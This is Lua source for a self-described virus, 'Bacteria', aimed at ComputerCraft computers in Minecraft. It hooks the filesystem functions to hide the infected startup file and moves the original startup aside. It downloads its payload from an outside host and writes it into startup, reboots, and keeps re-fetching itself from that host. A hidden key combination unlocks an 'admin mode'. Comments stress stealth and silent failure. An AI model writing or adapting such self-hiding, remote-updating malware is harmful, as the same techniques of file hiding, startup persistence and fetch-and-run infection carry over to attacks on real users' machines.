-- Bacteria CC Virus
-- Just be quiet, and nobody will notice you

if _G.bacteria then
    -- Bacteria already active
    return
end

local function runvirus()
    local exiting = false
    
    local oldfs = {}
    oldfs.open = fs.open
    oldfs.delete = fs.delete
    oldfs.move = fs.move
    oldfs.copy = fs.copy
    oldfs.exists = fs.exists
    oldfs.combine = fs.combine
    oldfs.list = fs.list
    local oldos = {}
    oldos.pullEventRaw = os.pullEventRaw
    
    
    local function redirect(path)
        if oldfs.combine("/", path) == "startup" then
            return "/.bacteriastartup"
        else
            return path
        end
    end
    
    fs.open = function(path, mode)
        return oldfs.open(redirect(path), mode)
    end
    
    fs.delete = function(path)
        return oldfs.delete(redirect(path))
    end
    
    fs.move = function(path, dest)
        return oldfs.move(redirect(path), redirect(dest))
    end
    
    fs.copy = function(path, dest)
        return oldfs.copy(redirect(path), redirect(dest))
    end
    
    fs.exists = function(path)
        return oldfs.exists(redirect(path))
    end
    
    fs.list = function(path)
        if oldfs.combine("/", path) == "" then
            if oldfs.exists("/.bacteriastartup") then
                return oldfs.list(path)
            else
                local list = oldfs.list("/")
                local newlist = {}
                for k, v in pairs(list) do
                    if v ~= "startup" then
                        table.insert(newlist, v)
                    end
                end
                return newlist
            end
        else
            return oldfs.list(path)
        end
    end
    
    local counter = -1
    local scounter = -1
    
    os.pullEventRaw = function(event)
        while true do
            local ev = { oldos.pullEventRaw() }
            if ev[1] == "key" then
                if ev[2] == 29 then
                    counter = os.clock()
                elseif ev[2] == 48 then
                    if os.clock() - counter < 0.2 then
                        scounter = os.clock()
                    end
                elseif ev[2] == 57 then
                    if os.clock() - scounter < 0.3 then
                        exiting = true
                    end
                end
            end
            if event then
                if ev[1] == event then
                    return unpack(ev)
                end
            else
                return unpack(ev)
            end
        end
    end
    
    local function runshell()
        term.clear()
        term.setCursorPos(1, 1)
        os.run({}, "/rom/programs/shell")
    end
    
    local function update()
        local fc = http.get("http://files.fluidnode.com/hidden/cc/bacteria.lua")
        if fc then
            oldfs.delete("/startup")
            local fh = oldfs.open("/startup", "w")
            fh.write(fc.readAll())
            fh.close()
        end
        while true do
            sleep(0.1)
            -- exit loop
            if exiting then
                return
            end
        end
    end
    
    parallel.waitForAny(runshell, update)
    
    if exiting then
        term.setBackgroundColor(colors.black)
        term.setTextColor(colors.white)
        term.clear()
        term.setCursorPos(1,1)
        print("Bacteria admin mode activated")
        for k, v in pairs(oldfs) do
            fs[k] = v
        end
        for k, v in pairs(oldos) do
            os[k] = v
        end
    else
        os.shutdown()
    end
end

if os.clock() == 0 then
    -- Running as startup
    _G.bacteria = runvirus
    _G.bacteria()
else
    -- Infect startup
    _G.bacteria = true
    if fs.exists("/startup") then
        fs.move("/startup", "/.bacteriastartup")
    end
    local fc = http.get("http://files.fluidnode.com/hidden/cc/bacteria.lua")
    if fc then
        local fh = fs.open("/startup", "w")
        if fh then
            fh.write(fc.readAll())
            fh.close()
            -- Restart? Must be a bug
            os.reboot()
        else
            -- Didn't work, fail silently
            _G.bacteria = false
        end
    else
        -- Didn't work, fail silently
        _G.bacteria = false
    end
end
